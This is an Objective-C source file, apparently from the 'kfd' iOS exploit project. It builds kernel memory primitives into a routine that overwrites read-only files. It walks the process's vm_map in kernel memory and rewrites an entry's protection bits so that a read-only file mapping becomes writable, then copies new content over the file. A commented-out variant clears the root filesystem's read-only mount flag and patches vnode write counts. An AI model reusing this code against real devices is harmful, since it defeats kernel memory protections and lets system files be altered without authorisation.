//
//  thanks_opa334dev_htrowii.m
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/07/30.
//

#import <Foundation/Foundation.h>
#import <sys/mman.h>
#import <UIKit/UIKit.h>
#import "krw.h"
#import "proc.h"

#define FLAGS_PROT_SHIFT    7
#define FLAGS_MAXPROT_SHIFT 11
//#define FLAGS_PROT_MASK     0xF << FLAGS_PROT_SHIFT
//#define FLAGS_MAXPROT_MASK  0xF << FLAGS_MAXPROT_SHIFT
#define FLAGS_PROT_MASK    0x780
#define FLAGS_MAXPROT_MASK 0x7800

uint64_t getTask(void) {
    uint64_t proc = getProc(getpid());
    uint64_t proc_ro = kread64(proc + 0x18);
    uint64_t pr_task = kread64(proc_ro + 0x8);
    printf("[i] self proc->proc_ro->pr_task: 0x%llx\n", pr_task);
    return pr_task;
}

uint64_t kread_ptr(uint64_t kaddr) {
    uint64_t ptr = kread64(kaddr);
    if ((ptr >> 55) & 1) {
        return ptr | 0xFFFFFF8000000000;
    }

    return ptr;
}

void kreadbuf(uint64_t kaddr, void* output, size_t size)
{
    uint64_t endAddr = kaddr + size;
    uint32_t outputOffset = 0;
    unsigned char* outputBytes = (unsigned char*)output;
    
    for(uint64_t curAddr = kaddr; curAddr < endAddr; curAddr += 4)
    {
        uint32_t k = kread32(curAddr);

        unsigned char* kb = (unsigned char*)&k;
        for(int i = 0; i < 4; i++)
        {
            if(outputOffset == size) break;
            outputBytes[outputOffset] = kb[i];
            outputOffset++;
        }
        if(outputOffset == size) break;
    }
}

uint64_t vm_map_get_header(uint64_t vm_map_ptr)
{
    return vm_map_ptr + 0x10;
}

uint64_t vm_map_header_get_first_entry(uint64_t vm_header_ptr)
{
    return kread_ptr(vm_header_ptr + 0x8);
}

uint64_t vm_map_entry_get_next_entry(uint64_t vm_entry_ptr)
{
    return kread_ptr(vm_entry_ptr + 0x8);
}


uint32_t vm_header_get_nentries(uint64_t vm_header_ptr)
{
    return kread32(vm_header_ptr + 0x20);
}

void vm_entry_get_range(uint64_t vm_entry_ptr, uint64_t *start_address_out, uint64_t *end_address_out)
{
    uint64_t range[2];
    kreadbuf(vm_entry_ptr + 0x10, &range[0], sizeof(range));
    if (start_address_out) *start_address_out = range[0];
    if (end_address_out) *end_address_out = range[1];
}


//void vm_map_iterate_entries(uint64_t vm_map_ptr, void (^itBlock)(uint64_t start, uint64_t end, uint64_t entry, BOOL *stop))
void vm_map_iterate_entries(uint64_t vm_map_ptr, void (^itBlock)(uint64_t start, uint64_t end, uint64_t entry, BOOL *stop))
{
    uint64_t header = vm_map_get_header(vm_map_ptr);
    uint64_t entry = vm_map_header_get_first_entry(header);
    uint64_t numEntries = vm_header_get_nentries(header);

    while (entry != 0 && numEntries > 0) {
        uint64_t start = 0, end = 0;
        vm_entry_get_range(entry, &start, &end);

        BOOL stop = NO;
        itBlock(start, end, entry, &stop);
        if (stop) break;

        entry = vm_map_entry_get_next_entry(entry);
        numEntries--;
    }
}

uint64_t vm_map_find_entry(uint64_t vm_map_ptr, uint64_t address)
{
    __block uint64_t found_entry = 0;
        vm_map_iterate_entries(vm_map_ptr, ^(uint64_t start, uint64_t end, uint64_t entry, BOOL *stop) {
            if (address >= start && address < end) {
                found_entry = entry;
                *stop = YES;
            }
        });
        return found_entry;
}

void vm_map_entry_set_prot(uint64_t entry_ptr, vm_prot_t prot, vm_prot_t max_prot)
{
    uint64_t flags = kread64(entry_ptr + 0x48);
    uint64_t new_flags = flags;
    new_flags = (new_flags & ~FLAGS_PROT_MASK) | ((uint64_t)prot << FLAGS_PROT_SHIFT);
    new_flags = (new_flags & ~FLAGS_MAXPROT_MASK) | ((uint64_t)max_prot << FLAGS_MAXPROT_SHIFT);
    if (new_flags != flags) {
        kwrite64(entry_ptr + 0x48, new_flags);
    }
}

uint64_t start = 0, end = 0;

uint64_t task_get_vm_map(uint64_t task_ptr)
{
    return kread_ptr(task_ptr + 0x28);
}

#pragma mark overwrite2
uint64_t funVnodeOverwrite2(char* to, char* from) {
    printf("attempting opa's method\n");
    
    int to_file_index = open(to, O_RDONLY);
    if (to_file_index == -1) return -1;
    off_t to_file_size = lseek(to_file_index, 0, SEEK_END);
    
    int from_file_index = open(from, O_RDONLY);
    if (from_file_index == -1) return -1;
    off_t from_file_size = lseek(from_file_index, 0, SEEK_END);
    
    
    if(to_file_size < from_file_size) {
        close(from_file_index);
        close(to_file_index);
        printf("[-] File is too big to overwrite!");
        return -1;
    }

    //mmap as read only
    printf("mmap as readonly\n");
    char* to_file_data = mmap(NULL, to_file_size, PROT_READ, MAP_SHARED, to_file_index, 0);
    if (to_file_data == MAP_FAILED) {
        close(to_file_index);
        // Handle error mapping source file
        return 0;
    }
    
    // set prot to re-
    printf("task_get_vm_map -> vm ptr\n");
    uint64_t vm_ptr = task_get_vm_map(getTask());
    uint64_t entry_ptr = vm_map_find_entry(vm_ptr, (uint64_t)to_file_data);
    printf("set prot to rw-\n");
    vm_map_entry_set_prot(entry_ptr, PROT_READ | PROT_WRITE, PROT_READ | PROT_WRITE);
    
    char* from_file_data = mmap(NULL, from_file_size, PROT_READ, MAP_PRIVATE, from_file_index, 0);
    if (from_file_data == MAP_FAILED) {
        perror("[-] Failed mmap (from_mapped)");
        close(from_file_index);
        close(to_file_index);
        return -1;
    }
    
    // WRITE
//    const char* data = "AAAAAAAAAAAAAAAAAAAAAAA";
//
//    size_t data_len = strlen(data);
//    off_t file_size = lseek(to_file_index, 0, SEEK_END);
//    if (file_size == -1) {
//        perror("Failed lseek.");
//    }
//
//    char* mapped = mmap(NULL, file_size, PROT_READ | PROT_WRITE, MAP_SHARED, to_file_index, 0);
//    if (mapped == MAP_FAILED) {
//        printf("Failed mapped here...\n");
//    }
    printf("it is writable!!\n");
    memcpy(to_file_data, from_file_data, from_file_size);

    // Cleanup
    munmap(from_file_data, from_file_size);
    munmap(to_file_data, to_file_size);
    
    close(from_file_index);
    close(to_file_index);

    // Return success or error code
    return 0;
}

/*
uint64_t funVnodeOverwriteFile(char* to, char* from) {

    int to_file_index = open(to, O_RDONLY);
    if (to_file_index == -1) return -1;
    off_t to_file_size = lseek(to_file_index, 0, SEEK_END);
    
    int from_file_index = open(from, O_RDONLY);
    if (from_file_index == -1) return -1;
    off_t from_file_size = lseek(from_file_index, 0, SEEK_END);
    
    if(to_file_size < from_file_size) {
        close(from_file_index);
        close(to_file_index);
        printf("[-] File is too big to overwrite!");
        return -1;
    }
    
    uint64_t proc = getProc(getpid());
    
    //get vnode
    uint64_t filedesc_pac = kread64(proc + off_p_pfd);
    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
    uint64_t openedfile = kread64(filedesc + (8 * to_file_index));
    uint64_t fileglob_pac = kread64(openedfile + off_fp_glob);
    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
    uint64_t vnode_pac = kread64(fileglob + off_fg_data);
    uint64_t to_vnode = vnode_pac | 0xffffff8000000000;
    printf("[i] %s to_vnode: 0x%llx\n", to, to_vnode);
    
    uint64_t rootvnode_mount_pac = kread64(findRootVnode() + off_vnode_v_mount);
    uint64_t rootvnode_mount = rootvnode_mount_pac | 0xffffff8000000000;
    uint32_t rootvnode_mnt_flag = kread32(rootvnode_mount + off_mount_mnt_flag);
    
    kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag & ~MNT_RDONLY);
    kwrite32(fileglob + off_fg_flag, O_ACCMODE);
    
    uint32_t to_vnode_v_writecount =  kread32(to_vnode + off_vnode_v_writecount);
    printf("[i] %s Increasing to_vnode->v_writecount: %d\n", to, to_vnode_v_writecount);
    if(to_vnode_v_writecount <= 0) {
        kwrite32(to_vnode + off_vnode_v_writecount, to_vnode_v_writecount + 1);
        printf("[+] %s Increased to_vnode->v_writecount: %d\n", to, kread32(to_vnode + off_vnode_v_writecount));
    }
    

    char* from_mapped = mmap(NULL, from_file_size, PROT_READ, MAP_PRIVATE, from_file_index, 0);
    if (from_mapped == MAP_FAILED) {
        perror("[-] Failed mmap (from_mapped)");
        kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag);
        close(from_file_index);
        close(to_file_index);
        return -1;
    }
    
    char* to_mapped = mmap(NULL, to_file_size, PROT_READ | PROT_WRITE, MAP_SHARED, to_file_index, 0);
    if (to_mapped == MAP_FAILED) {
        perror("[-] Failed mmap (to_mapped)");
        kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag);
        close(from_file_index);
        close(to_file_index);
        return -1;
    }
    
    memcpy(to_mapped, from_mapped, from_file_size);
    
    munmap(from_mapped, from_file_size);
    munmap(to_mapped, to_file_size);
    
    kwrite32(fileglob + off_fg_flag, O_RDONLY);
    kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag);
    
    close(from_file_index);
    close(to_file_index);

    return 0;
}
*/
